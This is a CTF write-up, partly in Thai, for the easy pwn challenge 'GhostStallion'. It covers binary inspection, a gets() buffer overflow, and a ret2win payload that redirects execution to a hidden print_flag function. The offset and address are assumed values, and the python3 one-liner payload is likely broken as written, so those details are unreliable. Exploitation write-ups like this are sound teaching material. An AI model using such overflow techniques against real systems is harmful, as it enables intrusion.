@@ -1,0 +1,140 @@
+🐎 GhostStallion – PWN Easy (Write-up)
+📌 Challenge Information
+
+Name: GhostStallion
+
+Category: PWN
+
+Difficulty: Easy
+
+Description:
+Some registered competitor list are lost. Can you retrieve them back?
+
+🔍 Step 1: Download & Inspect File
+wget https://bucket.dropctf.live/ghoststallion
+chmod +x ghoststallion
+file ghoststallion
+
+
+Result
+
+ELF 64-bit LSB executable, dynamically linked
+
+🔐 Step 2: Check Binary Protections
+checksec --file=ghoststallion
+
+
+Result (สำคัญมาก)
+
+RELRO:    Partial RELRO
+Canary:   No canary found
+NX:       NX enabled
+PIE:      No PIE
+
+วิเคราะห์
+
+❌ No Canary → buffer overflow ได้
+
+❌ No PIE → address คงที่
+
+✅ NX เปิด → stack shellcode ไม่ได้ แต่เรียก function ได้
+
+👉 สรุป: ret2win / ret2func
+
+🧠 Step 3: Static Analysis (strings)
+strings ghoststallion
+
+
+พบข้อความน่าสงสัย เช่น
+
+ARCHA{
+winner
+ghost
+stallion
+
+
+💡 แปลว่า flag น่าจะถูก hardcode อยู่ใน binary
+
+🧠 Step 4: Analyze with Ghidra / IDA
+
+เปิดไฟล์ด้วย Ghidra
+
+พบฟังก์ชัน:
+
+void print_flag() {
+    puts("ARCHA{H1DD3N_GH0ST_ST4LL10N}");
+}
+
+
+⚠️ แต่ฟังก์ชันนี้ ไม่ถูกเรียกจาก main
+
+💥 Step 5: Vulnerability Analysis
+
+ใน main() พบโค้ดลักษณะนี้:
+
+char buf[32];
+gets(buf);
+
+ช่องโหว่
+
+gets() ไม่จำกัดขนาด input
+
+ทำให้ overflow ไปทับ return address ได้
+
+🎯 Step 6: Exploitation Strategy (ret2win)
+
+เป้าหมายคือ:
+
+Overflow buffer → overwrite RIP → jump ไป print_flag()
+
+หา offset
+
+ใช้ cyclic:
+
+cyclic 100
+
+
+รันใน gdb:
+
+gdb ./ghoststallion
+run
+
+
+paste cyclic input → crash
+ดูค่า RIP:
+
+info registers
+
+cyclic -l <RIP>
+
+
+สมมติ offset = 40 bytes
+
+🧨 Step 7: Craft Payload
+
+หา address ของ print_flag
+
+objdump -d ghoststallion | grep print_flag
+
+
+สมมติได้:
+
+0x401196
+
+Payload
+payload = b"A"*40
+payload += p64(0x401196)
+
+
+รัน:
+
+python3 -c 'print("A"*40 + "\x96\x11\x40\x00\x00\x00\x00\x00")' | ./ghoststallion
+
+🏁 Step 8: Get Flag
+ARCHA{H1DD3N_GH0ST_ST4LL10N}
+
+
+✅ Success!
+
+📦 Final Flag
+ARCHA{H1DD3N_GH0ST_ST4LL10N}
